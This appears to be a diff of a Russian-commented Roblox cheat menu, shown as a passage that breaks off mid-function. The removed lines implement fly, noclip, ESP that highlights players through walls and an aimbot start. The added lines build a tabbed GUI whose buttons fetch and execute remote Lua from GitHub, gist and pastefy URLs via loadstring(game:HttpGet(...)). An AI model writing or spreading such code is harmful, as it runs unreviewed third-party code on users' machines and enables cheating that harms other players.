-SearchBox:GetPropertyChangedSignal("Text"):Connect(function()
-    local text = SearchBox.Text:lower()
-    for _, child in pairs(Scroll:GetChildren()) do
-        if child:IsA("TextButton") then child.Visible = child.Name:find(text) and true or false end
-    end
-end)
-
--- Функция для умного позиционирования окон (чтобы не накладывались)
-local function positionSideFrame(sideFrame)
-    if MainFrame.Visible then
-        -- Берем текущие координаты MainFrame и ставим окно справа (+305 пикселей)
-        sideFrame.Position = UDim2.new(
-            MainFrame.Position.X.Scale, 
-            MainFrame.Position.X.Offset + 305, 
-            MainFrame.Position.Y.Scale, 
-            MainFrame.Position.Y.Offset
-        )
-    end
-end
-
--- Кнопка открытия Скриптов
-OpenScripts.MouseButton1Click:Connect(function()
-    ScriptFrame.Visible = not ScriptFrame.Visible
-    PlayerFrame.Visible = false -- Скрываем другое окно
-    if ScriptFrame.Visible then
-        positionSideFrame(ScriptFrame)
-    end
-end)
-
--- Кнопка открытия Игрока
-OpenPlayer.MouseButton1Click:Connect(function()
-    PlayerFrame.Visible = not PlayerFrame.Visible
-    ScriptFrame.Visible = false -- Скрываем другое окно
-    if PlayerFrame.Visible then
-        positionSideFrame(PlayerFrame)
-    end
-end)
-
--- Кнопка открытия Анимаций
-OpenAnims.MouseButton1Click:Connect(function()
-    AnimFrame.Visible = not AnimFrame.Visible
-    
-    ScriptFrame.Visible = false
-    PlayerFrame.Visible = false
-    
-    if AnimFrame.Visible then
-        positionSideFrame(AnimFrame)
-    end
-end)
-
-
-InfJumpBtn.MouseButton1Click:Connect(function()
-    infJumpEnabled = not infJumpEnabled
-    InfJumpBtn.Text = "Прыжок: " .. (infJumpEnabled and "ВКЛ" or "ВЫКЛ")
-    InfJumpBtn.BackgroundColor3 = infJumpEnabled and Color_On or Color_Off
-end)
-
-AddFly.MouseButton1Click:Connect(function() flySpeed = flySpeed + 10 FlySpeedLabel.Text = "СКОРОСТЬ ПОЛЕТА: "..flySpeed end)
-SubFly.MouseButton1Click:Connect(function() flySpeed = math.max(0, flySpeed - 10) FlySpeedLabel.Text = "СКОРОСТЬ ПОЛЕТА: "..flySpeed end)
-
-FlyBtn.MouseButton1Click:Connect(function()
-    flyEnabled = not flyEnabled
-    FlyBtn.Text = "Полет: " .. (flyEnabled and "ВКЛ" or "ВЫКЛ")
-    FlyBtn.BackgroundColor3 = flyEnabled and Color_On or Color_Off
-    local char = localPlayer.Character
-    if char and char:FindFirstChild("Humanoid") then
-        if not flyEnabled then
-            char.Humanoid.PlatformStand = false
-            if char.HumanoidRootPart:FindFirstChild("FlyVel") then char.HumanoidRootPart.FlyVel:Destroy() end
-            if char.HumanoidRootPart:FindFirstChild("FlyGyro") then char.HumanoidRootPart.FlyGyro:Destroy() end
-        else
-            char.Humanoid.PlatformStand = true
-            local bg = Instance.new("BodyGyro", char.HumanoidRootPart) bg.Name = "FlyGyro" bg.maxTorque = Vector3.new(9e9,9e9,9e9)
-            local bv = Instance.new("BodyVelocity", char.HumanoidRootPart) bv.Name = "FlyVel" bv.maxForce = Vector3.new(9e9,9e9,9e9)
-        end
-    end
-end)
-
-UserInputService.JumpRequest:Connect(function() 
-    if infJumpEnabled and localPlayer.Character:FindFirstChildOfClass("Humanoid") then 
-        localPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState("Jumping") 
-    end 
-end)
-
-makeDraggable(MainFrame)
-makeDraggable(ScriptFrame)
-makeDraggable(PlayerFrame)
-
--- [[ ГЛАВНЫЙ ЦИКЛ ОБНОВЛЕНИЯ ]] --
-RunService.RenderStepped:Connect(function()
-    if not scriptActive then return end
-    
-    local char = localPlayer.Character
-    -- Проверяем наличие всех важных частей тела
-    if char and char:FindFirstChild("HumanoidRootPart") and char:FindFirstChild("Humanoid") then
-        local hrp = char.HumanoidRootPart
-        local hum = char.Humanoid
-		-- ЖЁСТКАЯ ФИКСАЦИЯ СКОРОСТИ
-if forceSpeed then
-    hum.WalkSpeed = savedSpeed
-end
-
-		if lockSpeedEnabled then
-            hum.WalkSpeed = savedSpeed
-        end
-        
-        -- Логика NoClip (Полное исправление)
-        if noclipEnabled then
-            for _, part in pairs(char:GetDescendants()) do
-                if part:IsA("BasePart") and part.CanCollide then
-                    part.CanCollide = false
-                end
-            end
-        else
-            -- ВКЛЮЧАЕМ коллизию только для ТОРСА, когда NoClip выключен
-            -- Это вернет персонажу физику, но не сломает его
-            if hrp.CanCollide == false then
-                hrp.CanCollide = true
-                if char:FindFirstChild("Torso") then char.Torso.CanCollide = true end
-                if char:FindFirstChild("UpperTorso") then char.UpperTorso.CanCollide = true end
-                if char:FindFirstChild("LowerTorso") then char.LowerTorso.CanCollide = true end
-            end
-        end
-        
--- Спидометр
-        -- Обновление поля ввода, если игрок не печатает в нем прямо сейчас
-if not SpeedInput:IsFocused() and hum then
-    SpeedInput.Text = tostring(math.floor(hum.WalkSpeed))
-end
-
-        -- Логика полета
-        if flyEnabled then
-            local camera = workspace.CurrentCamera
-            local bv = hrp:FindFirstChild("FlyVel")
-            local bg = hrp:FindFirstChild("FlyGyro")
-            if bv and bg then
-                bg.CFrame = camera.CFrame
-                local dir = Vector3.new(0,0,0)
-                if UserInputService:IsKeyDown(Enum.KeyCode.W) then dir = dir + camera.CFrame.LookVector end
-                if UserInputService:IsKeyDown(Enum.KeyCode.S) then dir = dir - camera.CFrame.LookVector end
-                if UserInputService:IsKeyDown(Enum.KeyCode.A) then dir = dir - camera.CFrame.RightVector end
-                if UserInputService:IsKeyDown(Enum.KeyCode.D) then dir = dir + camera.CFrame.RightVector end
-                bv.velocity = dir * flySpeed
-            end
-        end
-
-        -- Логика "Не подходи" (Anti-Approach)
-        if antiApproach then
-            for _, p in pairs(Players:GetPlayers()) do
-                if p ~= localPlayer and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
-                    local targetPos = p.Character.HumanoidRootPart.Position
-                    if (hrp.Position - targetPos).Magnitude < 14 then
-                        hrp.CFrame = hrp.CFrame + ((hrp.Position - targetPos).Unit * 3)
-                    end
-                end
-            end
-        end 
-
-        -- Логика Water Walk
-        if waterWalkActive then
-            local waterLevel = getWaterLevel(char)
-            if waterLevel then
-                waterPart.CanCollide = true
-                waterPart.CFrame = CFrame.new(hrp.Position.X, waterLevel - 0.8, hrp.Position.Z)
-            else
-                waterPart.CanCollide = false
-                waterPart.Position = Vector3.new(0, -1000, 0)
-            end
-        end
-
-    end 
-end) 
-
-
--- [[ УЛЬТИМАТИВНЫЙ ESP v18 (ВИДИТ ДАЖЕ СКВОЗЬ ПЛАЩ) ]] --
-local function applyESP(player)
-    if player == localPlayer then return end
-
-    local function setupESP(character)
-        if not character then return end
-        local hrp = character:WaitForChild("HumanoidRootPart", 5)
-        if not hrp then return end
-		-- РАНДОМНЫЙ ЦВЕТ ДЛЯ ИГРОКА
-local randomColor = Color3.fromRGB(
-    math.random(0,255),
-    math.random(0,255),
-    math.random(0,255)
-)
-
-        -- 1. СТАНДАРТНЫЙ HIGHLIGHT (Обводка)
-        local hl = character:FindFirstChild("JezHL") or Instance.new("Highlight")
-        hl.Name = "JezHL"
-        hl.Parent = character
-        hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
-        hl.FillColor = randomColor
-        hl.Enabled = espEnabled
-
-        -- 2. МЕТКА НАД ГОЛОВОЙ (Если игрок скрыл меши тела)
-        local bgui = hrp:FindFirstChild("JezTag") or Instance.new("BillboardGui")
-        bgui.Name = "JezTag"
-        bgui.Adornee = hrp
-        bgui.Parent = hrp
-        bgui.AlwaysOnTop = true
-        bgui.Size = UDim2.new(0, 100, 0, 50)
-        bgui.StudsOffset = Vector3.new(0, 3, 0) -- Метка чуть выше головы
-        bgui.Enabled = espEnabled
-
-        local label = bgui:FindFirstChild("Label") or Instance.new("TextLabel", bgui)
-        label.Name = "Label"
-        label.BackgroundTransparency = 1
-        label.Size = UDim2.new(1, 0, 1, 0)
-        label.Text = "● " .. player.Name .. " ●" -- Точка, которую видно всегда
-        label.TextColor3 = randomColor
-        label.TextStrokeTransparency = 0
-        label.Font = Enum.Font.GothamBold
-        label.TextSize = 14
-    end
-
-    player.CharacterAdded:Connect(setupESP)
-    if player.Character then setupESP(player.Character) end
-end
-
--- Авто-применение ко всем игрокам
-for _, p in pairs(Players:GetPlayers()) do
-    applyESP(p)
-end
-Players.PlayerAdded:Connect(applyESP)
-
--- [[ ФИНАЛЬНАЯ ЛОГИКА С ПРОВЕРКОЙ ]] --
-
-if FloatingBtn then
-    FloatingBtn.Activated:Connect(function()
-        if MainFrame then
-            MainFrame.Visible = true
-            FloatingBtn.Visible = false
-        end
-    end)
-end
-
--- Безопасный вызов перетаскивания
-local function safeDrag(obj)
-    if obj and type(makeDraggable) == "function" then
-        makeDraggable(obj)
-    end
-end
-
-safeDrag(MainFrame)
-if ScriptFrame then safeDrag(ScriptFrame) end
-if PlayerFrame then safeDrag(PlayerFrame) end
-
--- [[ ЛОГИКА AIMBOT (АКТИВАЦИЯ НА X) ]] --
-local aimbotEnabled = false
-local aimKeyHeld = false -- Переменная для отслеживания нажатия X
-local camera = workspace.CurrentCamera
-
--- Отслеживаем нажатие и отпускание клавиши X
 UserInputService.InputBegan:Connect(function(input, gameProcessed)
-    if not gameProcessed and input.KeyCode == Enum.KeyCode.X then
-        aimKeyHeld = true
+    if gameProcessed then return end
+    local keyObj = keyMap[input.KeyCode]
+    if keyObj and KeysFrame.Visible then
+        tween(keyObj.Tile, TweenInfo.new(0.08), {BackgroundColor3 = CurrentTheme.Grey})
+        tween(keyObj.Label, TweenInfo.new(0.08), {TextColor3 = CurrentTheme.White})
     end
 end)
 
 UserInputService.InputEnded:Connect(function(input)
-    if input.KeyCode == Enum.KeyCode.X then
-        aimKeyHeld = false
+    local keyObj = keyMap[input.KeyCode]
+    if keyObj and KeysFrame.Visible then
+        tween(keyObj.Tile, TweenInfo.new(0.12), {BackgroundColor3 = CurrentTheme.Dark})
+        tween(keyObj.Label, TweenInfo.new(0.12), {TextColor3 = CurrentTheme.White})
     end
 end)
 
--- Функция для поиска ближайшего игрока к центру экрана
-local function getClosestPlayer()
-    local closest = nil
-    local shortestDistance = math.huge
+-- ==========================================
+--              СОЗДАНИЕ ВКЛАДОК
+-- ==========================================
 
-    for _, p in pairs(game:GetService("Players"):GetPlayers()) do
-        if p ~= localPlayer and p.Character and p.Character:FindFirstChild("HumanoidRootPart") and p.Character:FindFirstChild("Humanoid") and p.Character.Humanoid.Health > 0 then
-            local pos, onScreen = camera:WorldToViewportPoint(p.Character.HumanoidRootPart.Position)
-            if onScreen then
-                local distance = (Vector2.new(pos.X, pos.Y) - Vector2.new(camera.ViewportSize.X/2, camera.ViewportSize.Y/2)).Magnitude
-                if distance < shortestDistance then
-                    closest = p.Character.HumanoidRootPart
-                    shortestDistance = distance
+local mainPage     = addTab("Main", L("Tabs").Main)
+local playerPage   = addTab("Player", L("Tabs").Player)
+local visualPage   = addTab("Visual", L("Tabs").Visual)
+local scriptsPage  = addTab("Scripts", L("Tabs").Scripts)
+local animationsPage = addTab("Animations", L("Tabs").Animations)
+local themesPage   = addTab("Themes", L("Tabs").Themes)
+local settingsPage = addTab("Settings", L("Tabs").Settings)
+
+-- ==========================================
+--        MAIN PAGE
+-- ==========================================
+
+local function createCard(parent, titleKey, contentKey)
+    local card = Instance.new("Frame", parent)
+    card.Size = UDim2.new(1, -8, 0, 10)
+    card.BackgroundColor3 = CurrentTheme.Dark
+    card.BorderSizePixel = 0
+    card.ZIndex = 4
+    Instance.new("UICorner", card).CornerRadius = UDim.new(0, 10)
+    
+    local stroke = Instance.new("UIStroke", card)
+    stroke.Thickness = 1.5
+    stroke.Color = CurrentTheme.Grey
+    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+
+    local padding = Instance.new("UIPadding", card)
+    padding.PaddingTop = UDim.new(0, 10)
+    padding.PaddingBottom = UDim.new(0, 10)
+    padding.PaddingLeft = UDim.new(0, 12)
+    padding.PaddingRight = UDim.new(0, 12)
+
+    local layout = Instance.new("UIListLayout", card)
+    layout.SortOrder = Enum.SortOrder.LayoutOrder
+    layout.Padding = UDim.new(0, 6)
+
+    local title = Instance.new("TextLabel", card)
+    title.Name = "CardTitle"
+    title.Size = UDim2.new(1, 0, 0, 22)
+    title.BackgroundTransparency = 1
+    title.Text = L(titleKey)
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 14
+    title.TextColor3 = CurrentTheme.White
+    title.TextXAlignment = Enum.TextXAlignment.Left
+    title.ZIndex = 5
+
+    local body = Instance.new("TextLabel", card)
+    body.Name = "CardBody"
+    body.Size = UDim2.new(1, 0, 0, 0)
+    body.AutomaticSize = Enum.AutomaticSize.Y
+    body.BackgroundTransparency = 1
+    body.Text = L(contentKey)
+    body.Font = Enum.Font.Gotham
+    body.TextSize = 12
+    body.TextColor3 = CurrentTheme.Light
+    body.TextXAlignment = Enum.TextXAlignment.Left
+    body.TextYAlignment = Enum.TextYAlignment.Top
+    body.TextWrapped = true
+    body.ZIndex = 5
+
+    layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+        card.Size = UDim2.new(1, -8, 0, layout.AbsoluteContentSize.Y + 22)
+    end)
+
+    table.insert(registeredButtons, {Button = card, Stroke = stroke})
+    return card
+end
+
+local newsCard = createCard(mainPage, "NewsTitle", "NewsContent")
+local guideCard = createCard(mainPage, "GuideTitle", "GuideContent")
+
+local newsTitleLabel = newsCard:FindFirstChild("CardTitle")
+
+local chatBtn = Instance.new("TextButton", newsTitleLabel or newsCard)
+chatBtn.Name = "ChatBtn"
+chatBtn.Size = UDim2.new(0, 70, 0, 24)
+chatBtn.AnchorPoint = Vector2.new(1, 0.5)
+chatBtn.Position = UDim2.new(1, 0, 0.5, 0)
+chatBtn.BackgroundColor3 = CurrentTheme.Black
+chatBtn.BorderSizePixel = 0
+chatBtn.Text = L("ChatBtn")
+chatBtn.Font = Enum.Font.GothamBold
+chatBtn.TextSize = 11
+chatBtn.TextColor3 = CurrentTheme.White
+chatBtn.ZIndex = 10
+Instance.new("UICorner", chatBtn).CornerRadius = UDim.new(0, 6)
+
+local chatBtnStroke = Instance.new("UIStroke", chatBtn)
+chatBtnStroke.Thickness = 1
+chatBtnStroke.Color = CurrentTheme.Grey
+table.insert(registeredButtons, {Button = chatBtn, Stroke = chatBtnStroke})
+
+chatBtn.MouseButton1Click:Connect(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://gist.githubusercontent.com/CatNour/51871883d52ae87a2443756863fd30c8/raw/N&J.lua"))()
+    end)
+end)
+
+-- ==========================================
+--        SCRIPTS PAGE
+-- ==========================================
+
+local searchBox
+do
+    local searchFrame = Instance.new("Frame", scriptsPage)
+    searchFrame.Name = "SearchFrame"
+    searchFrame.Size = UDim2.new(1, -8, 0, 38)
+    searchFrame.BackgroundColor3 = CurrentTheme.Dark
+    searchFrame.BorderSizePixel = 0
+    searchFrame.LayoutOrder = 0
+    searchFrame.ZIndex = 4
+    Instance.new("UICorner", searchFrame).CornerRadius = UDim.new(0, 8)
+
+    local searchStroke = Instance.new("UIStroke", searchFrame)
+    searchStroke.Thickness = 1.5
+    searchStroke.Color = CurrentTheme.Grey
+    searchStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+
+    local searchIcon = Instance.new("TextLabel", searchFrame)
+    searchIcon.Size = UDim2.new(0, 32, 1, 0)
+    searchIcon.BackgroundTransparency = 1
+    searchIcon.Text = "🔍"
+    searchIcon.TextSize = 14
+    searchIcon.ZIndex = 5
+
+    searchBox = Instance.new("TextBox", searchFrame)
+    searchBox.Size = UDim2.new(1, -38, 1, 0)
+    searchBox.Position = UDim2.new(0, 34, 0, 0)
+    searchBox.BackgroundTransparency = 1
+    searchBox.Text = ""
+    searchBox.PlaceholderText = L("SearchPlaceholder")
+    searchBox.PlaceholderColor3 = CurrentTheme.Light
+    searchBox.TextColor3 = CurrentTheme.White
+    searchBox.Font = Enum.Font.GothamMedium
+    searchBox.TextSize = 12
+    searchBox.TextXAlignment = Enum.TextXAlignment.Left
+    searchBox.ClearTextOnFocus = false
+    searchBox.ZIndex = 5
+
+    table.insert(registeredButtons, {Button = searchFrame, Stroke = searchStroke})
+end
+
+local function addScriptCard(parent, titleKey, descKey, executeCallback)
+    local titleText = Localizations[currentLanguage].ScriptsList[titleKey] or titleKey
+    local descText = Localizations[currentLanguage].ScriptsList[descKey] or descKey
+
+    local card = Instance.new("Frame", parent)
+    card.Name = "ScriptItem_" .. titleKey
+    card.Size = UDim2.new(1, -8, 0, 56)
+    card.BackgroundColor3 = CurrentTheme.Dark
+    card.BorderSizePixel = 0
+    card.ZIndex = 4
+    Instance.new("UICorner", card).CornerRadius = UDim.new(0, 8)
+
+    local stroke = Instance.new("UIStroke", card)
+    stroke.Thickness = 1.5
+    stroke.Color = CurrentTheme.Grey
+    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+
+    local title = Instance.new("TextLabel", card)
+    title.Size = UDim2.new(1, -90, 0, 22)
+    title.Position = UDim2.new(0, 12, 0, 8)
+    title.BackgroundTransparency = 1
+    title.Text = titleText
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 13
+    title.TextColor3 = CurrentTheme.White
+    title.TextXAlignment = Enum.TextXAlignment.Left
+    title.ZIndex = 5
+
+    local desc = Instance.new("TextLabel", card)
+    desc.Size = UDim2.new(1, -90, 0, 18)
+    desc.Position = UDim2.new(0, 12, 0, 30)
+    desc.BackgroundTransparency = 1
+    desc.Text = descText
+    desc.Font = Enum.Font.Gotham
+    desc.TextSize = 11
+    desc.TextColor3 = CurrentTheme.Light
+    desc.TextXAlignment = Enum.TextXAlignment.Left
+    desc.ZIndex = 5
+
+    local execBtn = Instance.new("TextButton", card)
+    execBtn.Name = "ExecBtn"
+    execBtn.Size = UDim2.new(0, 72, 0, 30)
+    execBtn.Position = UDim2.new(1, -80, 0.5, -15)
+    execBtn.BackgroundColor3 = CurrentTheme.Black
+    execBtn.Text = L("Execute")
+    execBtn.Font = Enum.Font.GothamBold
+    execBtn.TextSize = 11
+    execBtn.TextColor3 = CurrentTheme.White
+    execBtn.ZIndex = 6
+    Instance.new("UICorner", execBtn).CornerRadius = UDim.new(0, 6)
+
+    local execBtnStroke = Instance.new("UIStroke", execBtn)
+    execBtnStroke.Thickness = 1
+    execBtnStroke.Color = CurrentTheme.Grey
+
+    execBtn.MouseButton1Click:Connect(function()
+        local clickTweenInfo = TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, true)
+        local targetSize = UDim2.new(
+            execBtn.Size.X.Scale, execBtn.Size.X.Offset - 6, 
+            execBtn.Size.Y.Scale, execBtn.Size.Y.Offset - 4
+        )
+        tween(execBtn, clickTweenInfo, {Size = targetSize})
+
+        if executeCallback then executeCallback() end
+    end)
+
+    table.insert(registeredButtons, {Button = card, Stroke = stroke})
+    table.insert(registeredButtons, {Button = execBtn, Stroke = execBtnStroke})
+
+    table.insert(scriptCards, {
+        Frame = card, 
+        TitleLabel = title,
+        DescLabel = desc,
+        ExecBtn = execBtn,
+        TitleKey = titleKey,
+        DescKey = descKey,
+        Title = titleText:lower(), 
+        Desc = descText:lower()
+    })
+    return card
+end
+
+searchBox:GetPropertyChangedSignal("Text"):Connect(function()
+    local query = searchBox.Text:lower():match("^%s*(.-)%s*$")
+    for _, item in ipairs(scriptCards) do
+        if query == "" or string.find(item.Title, query, 1, true) or string.find(item.Desc, query, 1, true) then
+            item.Frame.Visible = true
+        else
+            item.Frame.Visible = false
+        end
+    end
+end)
+
+addScriptCard(scriptsPage, "LuckyTitle", "LuckyDesc", function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Korol1Laguwok/Jez-Scripts/refs/heads/main/Jez%20lucky"))()
+    end)
+end)
+
+addScriptCard(scriptsPage, "FlingTitle", "FlingDesc", function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Korol1Laguwok/Jez-Scripts/refs/heads/main/Jez%20fling"))()
+    end)
+end)
+
+addScriptCard(scriptsPage, "HiderTitle", "HiderDesc", function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Korol1Laguwok/Jez-Scripts/refs/heads/main/Jez%20Hider"))()
+    end)
+end)
+
+addScriptCard(scriptsPage, "CoordsTitle", "CoordsDesc", function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Korol1Laguwok/Jez-Scripts/refs/heads/main/JEZ%20COORDINATES"))()
+    end)
+end)
+
+addScriptCard(scriptsPage, "BridgeTitle", "BridgeDesc", function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Korol1Laguwok/Jez-Scripts/refs/heads/main/Impossible%20Squid%20Game%20Glass%20Bridge%202"))()
+    end)
+end)
+
+addScriptCard(scriptsPage, "TimeTitle", "TimeDesc", function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Korol1Laguwok/Jez-Scripts/refs/heads/main/TIME"))()
+    end)
+end)
+
+do
+    local animCard = Instance.new("Frame", animationsPage)
+    animCard.Name = "AnimCard"
+    animCard.Size = UDim2.new(1, -8, 0, 95)
+    animCard.BackgroundColor3 = CurrentTheme.Dark
+    animCard.BorderSizePixel = 0
+    animCard.ZIndex = 4
+    Instance.new("UICorner", animCard).CornerRadius = UDim.new(0, 10)
+
+    local animStroke = Instance.new("UIStroke", animCard)
+    animStroke.Thickness = 1.5
+    animStroke.Color = CurrentTheme.Grey
+    animStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    table.insert(registeredButtons, {Button = animCard, Stroke = animStroke})
+
+    local animTitle = Instance.new("TextLabel", animCard)
+    animTitle.Name = "AnimTitle"
+    animTitle.Size = UDim2.new(1, -24, 0, 25)
+    animTitle.Position = UDim2.new(0, 12, 0, 10)
+    animTitle.BackgroundTransparency = 1
+    animTitle.Text = L("AnimationsTitle")
+    animTitle.Font = Enum.Font.GothamBold
+    animTitle.TextSize = 13
+    animTitle.TextColor3 = CurrentTheme.White
+    animTitle.TextXAlignment = Enum.TextXAlignment.Left
+    animTitle.ZIndex = 5
+
+    local r6Btn = Instance.new("TextButton", animCard)
+    r6Btn.Name = "R6Btn"
+    r6Btn.Size = UDim2.new(0.5, -18, 0, 35)
+    r6Btn.Position = UDim2.new(0, 12, 0, 45)
+    r6Btn.BackgroundColor3 = CurrentTheme.Black
+    r6Btn.Text = L("R6Btn")
+    r6Btn.Font = Enum.Font.GothamBold
+    r6Btn.TextSize = 12
+    r6Btn.TextColor3 = CurrentTheme.White
+    r6Btn.ZIndex = 6
+    Instance.new("UICorner", r6Btn).CornerRadius = UDim.new(0, 6)
+
+    local r6BtnStroke = Instance.new("UIStroke", r6Btn)
+    r6BtnStroke.Thickness = 1
+    r6BtnStroke.Color = CurrentTheme.Grey
+    table.insert(registeredButtons, {Button = r6Btn, Stroke = r6BtnStroke})
+
+    r6Btn.MouseButton1Click:Connect(function()
+        pcall(function()
+             loadstring(game:HttpGet("https://raw.githubusercontent.com/Fixel656/Roblox-Emotes-GUI-Script-R6-R15/refs/heads/main/MainScript.lua",true))()
+             loadstring(game:HttpGet("https://pastefy.app/wa3v2Vgm/raw"))("Spider Script")
+        end)
+    end)
+
+    local r15Btn = Instance.new("TextButton", animCard)
+    r15Btn.Name = "R15Btn"
+    r15Btn.Size = UDim2.new(0.5, -18, 0, 35)
+    r15Btn.Position = UDim2.new(0.5, 6, 0, 45)
+    r15Btn.BackgroundColor3 = CurrentTheme.Black
+    r15Btn.Text = L("R15Btn")
+    r15Btn.Font = Enum.Font.GothamBold
+    r15Btn.TextSize = 12
+    r15Btn.TextColor3 = CurrentTheme.White
+    r15Btn.ZIndex = 6
+    Instance.new("UICorner", r15Btn).CornerRadius = UDim.new(0, 6)
+
+    local r15BtnStroke = Instance.new("UIStroke", r15Btn)
+    r15BtnStroke.Thickness = 1
+    r15BtnStroke.Color = CurrentTheme.Grey
+    table.insert(registeredButtons, {Button = r15Btn, Stroke = r15BtnStroke})
+
+    r15Btn.MouseButton1Click:Connect(function()
+        pcall(function()
+             loadstring(game:HttpGet("https://raw.githubusercontent.com/Fixel656/Roblox-Emotes-GUI-Script-R6-R15/refs/heads/main/MainScript.lua",true))()
+             loadstring(game:HttpGet("https://pastefy.app/YZoglOyJ/raw"))()
+        end)
+    end)
+end
+
+-- ==========================================
+--        PLAYER PAGE
+-- ==========================================
+
+local updateSpeedDisplay, applySpeed
+
+do
+    local speedCard = Instance.new("Frame", playerPage)
+    speedCard.Name = "SpeedCard"
+    speedCard.Size = UDim2.new(1, -8, 0, 95)
+    speedCard.BackgroundColor3 = CurrentTheme.Dark
+    speedCard.BorderSizePixel = 0
+    speedCard.Active = true
+    speedCard.ZIndex = 4
+    Instance.new("UICorner", speedCard).CornerRadius = UDim.new(0, 10)
+
+    local speedCardStroke = Instance.new("UIStroke", speedCard)
+    speedCardStroke.Thickness = 1.5
+    speedCardStroke.Color = CurrentTheme.Grey
+    speedCardStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    table.insert(registeredButtons, {Button = speedCard, Stroke = speedCardStroke})
+
+    local speedTitle = Instance.new("TextLabel", speedCard)
+    speedTitle.Name = "SpeedTitle"
+    speedTitle.Size = UDim2.new(1, -90, 0, 25)
+    speedTitle.Position = UDim2.new(0, 12, 0, 8)
+    speedTitle.BackgroundTransparency = 1
+    speedTitle.Text = L("SpeedTitle")
+    speedTitle.Font = Enum.Font.GothamBold
+    speedTitle.TextSize = 13
+    speedTitle.TextColor3 = CurrentTheme.White
+    speedTitle.TextXAlignment = Enum.TextXAlignment.Left
+    speedTitle.ZIndex = 5
+
+    local speedInput = Instance.new("TextBox", speedCard)
+    speedInput.Size = UDim2.new(0, 48, 0, 24)
+    speedInput.Position = UDim2.new(1, -96, 0, 8)
+    speedInput.BackgroundColor3 = CurrentTheme.Black
+    speedInput.Text = tostring(currentSpeed)
+    speedInput.Font = Enum.Font.GothamBold
+    speedInput.TextSize = 12
+    speedInput.TextColor3 = CurrentTheme.White
+    speedInput.BorderSizePixel = 0
+    speedInput.ZIndex = 6
+    Instance.new("UICorner", speedInput).CornerRadius = UDim.new(0, 6)
+
+    local inputStroke = Instance.new("UIStroke", speedInput)
+    inputStroke.Thickness = 1
+    inputStroke.Color = CurrentTheme.Grey
+    table.insert(registeredButtons, {Button = speedInput, Stroke = inputStroke})
+
+    local SpeedLockBtn = Instance.new("TextButton", speedCard)
+    SpeedLockBtn.Size = UDim2.new(0, 32, 0, 24)
+    SpeedLockBtn.Position = UDim2.new(1, -42, 0, 8)
+    SpeedLockBtn.BackgroundColor3 = CurrentTheme.Black
+    SpeedLockBtn.BorderSizePixel = 0
+    SpeedLockBtn.Text = isSpeedLocked and "🔒" or "🔓"
+    SpeedLockBtn.TextSize = 14
+    SpeedLockBtn.ZIndex = 6
+    Instance.new("UICorner", SpeedLockBtn).CornerRadius = UDim.new(0, 6)
+
+    local lockStroke = Instance.new("UIStroke", SpeedLockBtn)
+    lockStroke.Thickness = 1
+    lockStroke.Color = CurrentTheme.Grey
+    table.insert(registeredButtons, {Button = SpeedLockBtn, Stroke = lockStroke})
+
+    local infoLabel = Instance.new("TextLabel", speedCard)
+    infoLabel.Name = "InfoLabel"
+    infoLabel.Size = UDim2.new(1, -24, 0, 20)
+    infoLabel.Position = UDim2.new(0, 12, 0, 36)
+    infoLabel.BackgroundTransparency = 1
+    infoLabel.Font = Enum.Font.GothamMedium
+    infoLabel.TextSize = 11
+    infoLabel.TextColor3 = CurrentTheme.White
+    infoLabel.TextXAlignment = Enum.TextXAlignment.Left
+    infoLabel.ZIndex = 5
+
+    local resetBtn = Instance.new("TextButton", speedCard)
+    resetBtn.Name = "ResetBtn"
+    resetBtn.Size = UDim2.new(0.47, 0, 0, 24)
+    resetBtn.Position = UDim2.new(0, 12, 0, 62)
+    resetBtn.BackgroundColor3 = CurrentTheme.Black
+    resetBtn.Text = L("ResetSpeed")
+    resetBtn.Font = Enum.Font.GothamMedium
+    resetBtn.TextSize = 10
+    resetBtn.TextColor3 = CurrentTheme.White
+    resetBtn.ZIndex = 5
+    Instance.new("UICorner", resetBtn).CornerRadius = UDim.new(0, 6)
+
+    local resetBtnStroke = Instance.new("UIStroke", resetBtn)
+    resetBtnStroke.Thickness = 1
+    resetBtnStroke.Color = CurrentTheme.Grey
+    table.insert(registeredButtons, {Button = resetBtn, Stroke = resetBtnStroke})
+
+    local boostBtn = Instance.new("TextButton", speedCard)
+    boostBtn.Name = "BoostBtn"
+    boostBtn.Size = UDim2.new(0.47, 0, 0, 24)
+    boostBtn.Position = UDim2.new(0.53, 0, 0, 62)
+    boostBtn.BackgroundColor3 = CurrentTheme.Black
+    boostBtn.Text = L("BoostSpeed")
+    boostBtn.Font = Enum.Font.GothamMedium
+    boostBtn.TextSize = 10
+    boostBtn.TextColor3 = CurrentTheme.White
+    boostBtn.ZIndex = 5
+    Instance.new("UICorner", boostBtn).CornerRadius = UDim.new(0, 6)
+
+    local boostBtnStroke = Instance.new("UIStroke", boostBtn)
+    boostBtnStroke.Thickness = 1
+    boostBtnStroke.Color = CurrentTheme.Grey
+    table.insert(registeredButtons, {Button = boostBtn, Stroke = boostBtnStroke})
+
+    local minSpeed = 1
+    local maxSpeed = math.huge
+
+    function updateSpeedDisplay()
+        infoLabel.Text = L("BaseSpeed") .. tostring(defaultSpeed) .. L("CurrentSpeed") .. tostring(currentSpeed)
+    end
+
+    function applySpeed(val)
+        val = math.clamp(math.floor(val or 1), minSpeed, maxSpeed)
+        currentSpeed = val
+        
+        speedInput.Text = tostring(val)
+        updateSpeedDisplay()
+        
+        if LocalPlayer.Character then
